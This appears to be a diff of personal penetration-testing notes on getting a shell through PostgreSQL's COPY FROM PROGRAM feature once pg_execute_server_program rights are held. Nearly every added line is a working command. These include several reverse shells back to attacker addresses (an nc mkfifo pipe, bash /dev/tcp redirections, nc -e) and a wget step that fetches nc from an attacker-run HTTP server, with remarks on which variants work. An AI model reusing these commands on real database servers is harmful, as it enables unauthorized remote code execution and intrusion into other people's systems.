@@ -22,18 +22,20 @@ From the first Line we have pg_execute_server_program permission
 
 #To get a shell:
 	CREATE TABLE shell(output text);
-	COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.0.0.1 1234 >/tmp/f’;
+	COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.0.0.1 1234 >/tmp/f';
 										    ###Replace this###
 										    This does not work
-										    with bash -i &> /dev/tcp ... trick, it does not give output
-										    not sure how msfconsole work but, if the target does not have
-										    nc, we need to upload or using metasploit to exploit
+										    with bash -i &> /dev/tcp ... trick, 
+										    it does not give output
+										    if the target does not have nc, 
+										    we need to upload
+	#upload nc incase the target not having one
+           1. setup http server
+           2. COPY shell FROM PROGRAM 'wget http://192.168.234.30/nc';
 
-	COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| /bin/sh -i >& /dev/tcp/192.168.49.209/8080 0>&1';   
-								     ###############################################
-								     this works with the bash trick
-								     remove the >/tmp/f at the end;
-								     and discard the | nc 10.0.0.1 1234 part
+	COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.209/8080 0>&1 >/tmp/f"';   #this works too remove /tmp/f also work so... a alot of possible ways
+	COPY shell FROM PROGRAM 'bash -c "/bin/bash -i >& /dev/tcp/192.168.49.147/80 0>&1"'  # this works as well
+        COPY shell FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash'              # this works too
 
 #Full details here:
 https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
